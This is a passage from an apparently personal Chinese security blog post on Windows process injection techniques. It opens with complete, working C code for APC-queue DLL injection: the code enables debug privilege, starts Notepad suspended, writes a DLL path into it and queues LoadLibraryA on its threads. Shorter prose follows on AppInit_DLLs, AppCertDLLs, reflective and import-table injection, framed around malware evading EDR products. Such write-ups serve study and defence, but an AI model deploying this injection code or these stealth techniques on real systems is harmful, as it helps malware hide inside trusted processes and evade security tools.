<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br>DWORD GetProcessPID(<span class="hljs-type">char</span>* lpProcessName) &#123;<br><br>	DWORD ret = <span class="hljs-number">0</span>; <span class="hljs-comment">// 存储找到的进程ID，初始为0（未找到）</span><br>	PROCESSENTRY32 P32;<span class="hljs-comment">// 结构体，用于存储进程快照信息</span><br><br>	<span class="hljs-comment">//获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br>	HANDLE IpSnashot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">if</span> (IpSnashot == INVALID_HANDLE_VALUE) &#123;<br>		printf(<span class="hljs-string">&quot;获取进程快照失败，请检查原因。erro:%d&quot;</span>, GetLastError());<br>	&#125;<br>	P32.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32);<br>	Process32First(IpSnashot, &amp;P32);<span class="hljs-comment">// 获取快照中第一个进程信息</span><br><br>	<span class="hljs-keyword">do</span> &#123;<br>		<span class="hljs-keyword">if</span> (!lstrcmp(P32.szExeFile, lpProcessName)) &#123;<span class="hljs-comment">// 比较进程名</span><br><br>			ret = P32.th32ProcessID;<span class="hljs-comment">// 匹配成功，记录PID</span><br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>	&#125; <span class="hljs-keyword">while</span> (Process32Next(IpSnashot, &amp;P32)); <span class="hljs-comment">//检索有关系统快照中记录的下一个进程的信息。</span><br>	CloseHandle(IpSnashot);<span class="hljs-comment">//关闭句柄 </span><br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><br><span class="hljs-comment">//提权函数(注入到线程需要权限)</span><br><span class="hljs-type">BOOL</span> EnableDebugPrivilege() &#123;<br>	HANDLE hToken;<br>	<span class="hljs-type">BOOL</span> fok;<br>	<span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123;<br>		TOKEN_PRIVILEGES tp;<br>		tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>		LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="hljs-number">0</span>].Luid);<br>		tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>		AdjustTokenPrivileges(hToken, <span class="hljs-literal">FALSE</span>, &amp;tp, <span class="hljs-keyword">sizeof</span>(tp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>		fok = (GetLastError() == ERROR_SUCCESS);<br>		CloseHandle(hToken);<br><br><br><br><br>	&#125;<br>	<span class="hljs-keyword">return</span> fok;<br><br><br><br>&#125;<br><span class="hljs-type">BOOL</span> ApcInjectDll(DWORD dwPid, <span class="hljs-type">char</span>* pszDllName) &#123;<br><br>	EnableDebugPrivilege();<br>	<span class="hljs-comment">//1.打开进程获取进程句柄</span><br>	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, dwPid);<br>	<span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>		printf(<span class="hljs-string">&quot;openProcess erro! ;&quot;</span>, GetLastError());<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><br><br>	&#125;<br>	<span class="hljs-comment">//2.申请内存空间</span><br>	<span class="hljs-type">int</span> nsize = strlen(pszDllName);<br>	LPVOID PDDLaddr = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, nsize, MEM_COMMIT, PAGE_READWRITE);<br><br>	<span class="hljs-comment">//3. WriteProcessMemory 写入dll信息 </span><br>	SIZE_T wWrittenSize = <span class="hljs-number">0</span>;<br>	WriteProcessMemory(hProcess, PDDLaddr, pszDllName, nsize, &amp;wWrittenSize);<br>	<span class="hljs-comment">//4.获取到Loadlibary地址，等会加载dll</span><br>	HMODULE hmod = GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br>	FARPROC pFuncAddr = GetProcAddress(hmod, <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>	<span class="hljs-comment">//5.给进程的每一个线程都注入APC序列确保能执行成功</span><br>	THREADENTRY32 te = &#123; <span class="hljs-number">0</span> &#125;;<br>	te.dwSize = <span class="hljs-keyword">sizeof</span>(te);<br><br>	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span> (hSnap == INVALID_HANDLE_VALUE) &#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>	&#125;<br>	DWORD dwRet = <span class="hljs-number">0</span>;<br>	HANDLE hThread = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">if</span> (Thread32First(hSnap, &amp;te)) &#123;<br>		<span class="hljs-keyword">do</span> &#123;<br>			<span class="hljs-keyword">if</span> (te.th32OwnerProcessID == dwPid) &#123;<br>				hThread = OpenThread(THREAD_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, te.th32ThreadID);<br>				<span class="hljs-keyword">if</span> (hThread) &#123;<br>					<span class="hljs-comment">//往APC队列中插入Load；ibary函数 参数为PDDLadd</span><br>					dwRet = QueueUserAPC((PAPCFUNC)pFuncAddr, hThread, (ULONG_PTR)PDDLaddr);<br>					hThread = <span class="hljs-literal">NULL</span>;<br>				&#125;<br>			&#125;<br>		&#125; <span class="hljs-keyword">while</span> (Thread32Next(hSnap, &amp;te));<br>	&#125;<br><br>	CloseHandle(hThread);<br>	CloseHandle(hProcess);<br>	CloseHandle(hSnap);<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br><br>&#125;<br><span class="hljs-type">int</span> main()<br>&#123;<br>	STARTUPINFO si = &#123; <span class="hljs-number">0</span> &#125;;<br>	PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br>	si.cb = <span class="hljs-keyword">sizeof</span>(STARTUPINFO);<br><br>	<span class="hljs-type">int</span> pid = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">if</span> (CreateProcessA(<span class="hljs-string">&quot;C:\\Program Files\\WindowsApps\\Microsoft.WindowsNotepad_11.2507.26.0_x64__8wekyb3d8bbwe\\Notepad\\Notepad.exe&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">TRUE</span>, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPSTARTUPINFOA)&amp;si, &amp;pi) == <span class="hljs-literal">FALSE</span>) &#123;<br>        printf(<span class="hljs-string">&quot;创建进程失败&quot;</span>);<br>	<br>	&#125;<br>    pid = GetProcessPID(<span class="hljs-string">&quot;Notepad.exe&quot;</span>);<br>	<span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>		printf(<span class="hljs-string">&quot;未找到进程&quot;</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>	<span class="hljs-type">char</span>* dll_path = <span class="hljs-string">&quot;F:\\c\\yawatadll\\x64\\Release\\yawatadll.dll&quot;</span>;<br>	<br>	<br>	<span class="hljs-keyword">if</span> (ApcInjectDll(pid, dll_path)) &#123;<br>		ResumeThread(pi.hThread);<br>		printf(<span class="hljs-string">&quot;注入成功&quot;</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>	<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20251003170846661.png" srcset="/img/loading.gif" lazyload alt="image-20251003170846661"></p>
<h1 id="AppInit-DLLs注入"><a href="#AppInit-DLLs注入" class="headerlink" title="AppInit_DLLs注入"></a>AppInit_DLLs注入</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>这是 Windows 系统为方便进行系统层扩展而提供的机制。加载 user32.dll（几乎所有图形用户界面（GUI）应用都会加载该文件）的应用程序，都会读取由该机制在注册表中指定的动态链接库（DLL）。不过，从 Windows 7 系统开始，需要手动将注册表中的 “LoadAppInit_DLLs” 项设置为 “1”（该值默认为 “0”），并且还需通过设置 “RequireSignedAppInit_DLLs&#x3D;1” 来强制验证相关 DLL 的数字签名。</p>
<h2 id="流程："><a href="#流程：" class="headerlink" title="流程："></a>流程：</h2><p>修改注册表项 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs，写入 DLL 的路径。</p>
<p>设置 LoadAppInit_DLLs＝1（必要时将 RequireSignedAppInit_DLLs 设为 0）。</p>
<p>每当程序加载 user32.dll 时，Windows 加载器会自动调用 LoadLibrary 来加载该列表中的 DLL。</p>
<p>优点是一次设置就能实现全系统注入，且重启后仍持续有效；缺点是特征非常明显，也最容易被发现。</p>
<h1 id="AppCertDLLs注入"><a href="#AppCertDLLs注入" class="headerlink" title="AppCertDLLs注入"></a>AppCertDLLs注入</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>这一机制和上面的 AppInit_DLLs 很相似，它处于会话管理器（Session Manager）阶段，任何调用 CreateProcess、WinExec 函数的程序都会先加载该机制在注册表中指定的 DLL。</p>
<p>它比 AppInit_DLLs 更精准，仅针对需要生成子进程的程序流程，常见于防毒软件的动态拦截或家长监控软件中。其缺点与 AppInit_DLLs 类似：需要写入系统注册表，且在现代 Windows 系统中会受到签名限制；此外，仅具备图形界面（GUI-only）的应用程序如果内部不调用 CreateProcess 函数，就不会触发该机制。</p>
<h1 id="反射dll注入"><a href="#反射dll注入" class="headerlink" title="反射dll注入"></a>反射dll注入</h1><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>dll注入技术是让某个进程主动加载指定的dll的技术。恶意软件为了提高隐蔽性，通常会使用dll注入技术将自身的恶意代码以dll的形式注入高可信进程。</p>
<p>常规的dll注入技术使用LoadLibraryA()函数来使被注入进程加载指定的dll。常规dll注入的方式一个致命的缺陷是需要恶意的dll以文件的形式存储在受害者主机上。这样使得常规dll注入技术在受害者主机上留下痕迹较大，很容易被edr等安全产品检测到。为了弥补这个缺陷，stephen fewer提出了反射式dll注入技术并在<a target="_blank" rel="noopener" href="https://github.com/stephenfewer/ReflectiveDLLInjection">github开源</a>，反射式dll注入技术的优势在于可以使得恶意的dll通过socket等方式直接传输到目标进程内存并加载，期间无任何文件落地，安全产品的检测难度大大增加。</p>
<h2 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h2><p>这里的具体讲述我就给到先知社区的这个大佬的文章了，因为太过于完美了，我不知道写什么。在他这篇文章面前，我再怎么诉说反射dll注入，都不如大家看他的一眼。</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17089">自举的代码幽灵——反射DLL注入（Reflective DLL Injection）-先知社区</a></p>
<h1 id="PE注入"><a href="#PE注入" class="headerlink" title="PE注入"></a>PE注入</h1><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>当程序被加载时，系统会根据程序导入表信息来加载需要用到的dll,导入表注入的原理就是修改程序的导入表，将自己的dll添加到程序的导入表中，这样程序运行时可以将自己的DLL加载到程序的进程空间.</p>
<p>具体的可以看下面两个大佬的文章，因为涉及到PE结构，那么过程就会很复杂，一时半会也写不完，后面有时间再填这个坑吧</p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-262420.htm">原创]PE基础之导入表注入-软件逆向-看雪论坛-安全社区|非营利性质技术交流社区</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/6905132975">https://zhuanlan.zhihu.com/p/6905132975</a></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>除了本章深入探讨的 DLL 注入技术，还有诸多其他注入技艺。考虑到内容的合理编排，我已将这些独立且内容丰富的技术，如 DLL Hollowing、进程镂空以及特洛伊 DLL 注入（即 DLL 劫持）等，分散到后续专题中进行详细阐述。敬请期待，我将逐一深入剖析这些注入技艺的奥秘。</p>
<p>若有疏漏或不足之处，还请各位不吝赐教。</p>
<p>我是 yawataa，我们下一篇再见！</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>注入的技艺</div>
      <div>http://example.com/2025/10/02/注入的技艺/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>October 2, 2025</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/10/05/%E3%80%8A%E8%81%8A%E8%81%8A%E5%85%8D%E6%9D%80%E7%9A%84%E9%82%A3%E4%BA%9B%E2%80%9C%E5%B0%8F%E6%8A%8A%E6%88%8F%E2%80%9D%EF%BC%9A%E9%95%82%E7%A9%BA%E3%80%81%E4%BC%AA%E8%A3%85%E5%92%8C%E4%BB%A3%E7%A0%81%E8%97%8F%E5%8C%BF%E3%80%8B/" title="《聊聊免杀的那些“把戏”：镂空、伪装和代码藏匿》">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">《聊聊免杀的那些“把戏”：镂空、伪装和代码藏匿》</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/03/07/hello-world/" title="Hello World">
                        <span class="hidden-mobile">Hello World</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
